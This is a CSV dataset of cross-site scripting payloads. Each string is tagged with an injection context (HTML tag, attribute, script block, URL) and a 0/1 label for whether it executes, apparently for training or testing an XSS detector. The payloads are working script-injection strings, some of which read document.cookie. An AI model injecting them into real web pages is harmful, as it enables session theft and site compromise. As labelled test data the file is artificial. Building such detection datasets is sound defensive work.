payload,context,exec
</textarea><svg/onload=alert(1)>,html_tag,1
""";alert(location);//",script_block,1
src=image,html_tag,0
C++ programming,html_text,0
javascript:alert(1),url_navigation,1
""" onkeyup=alert(1) """,html_tag,0
javascript:prompt(1),url_href,1
<iframe src=javascript:alert(1)>,url_href,0
"data:text/html,<script>alert(document.cookie)</script>",url_navigation,1
"data:text/html,<svg/onload=alert(1)>",url_href,0
""" onblur=alert(1) """,html_attribute,1
</script><svg/onload=alert(1)>,html_tag,1
<iframe src=javascript:alert(1)>,html_tag,1
<source onerror=alert(1)>,url_href,0
javascript:confirm(1),url_href,1
%3Ciframe%3E,html_text,0
<img src=x onerror=alert(1)//>,html_tag,1
""" onpointerover=alert(1) """,html_attribute,1
</pre><svg/onload=alert`1`>,script_block,0
<input onfocus=alert(1) autofocus>,html_tag,1
<svg onload=prompt(1)>,html_tag,1
"<iframe srcdoc=""<script>alert(1)</script>"">",html_attribute,0
<IMG SRC=x ONERROR=alert(1)>,html_text,0
<img src=x onerror=alert(window.origin)>,html_tag,1
<svg><script>confirm(1)</script>,html_tag,1
javascript:alert(document.cookie),url_href,1
</title><svg/onload=alert(1)>,script_block,0
""" onmouseover=alert(1)",html_attribute,1
""";alert(document.domain);//",script_block,1
javascript:prompt`1`,url_href,1
</pre><marquee onstart=alert(1)>,html_text,0
"data:text/html,<script>prompt(1)</script>",url_navigation,1
"""><script>alert(1)</script>",html_attribute,1
<script>\u0061lert(1)</script>,html_tag,1
just_a_string,html_text,0
<random>,html_text,0
test123,html_text,0
""";alert(history.length);//",script_block,1
<img src=x onerror=confirm(1)>,html_tag,1
javascript:alert(history.length),url_href,1
""";confirm(1);//",script_block,1
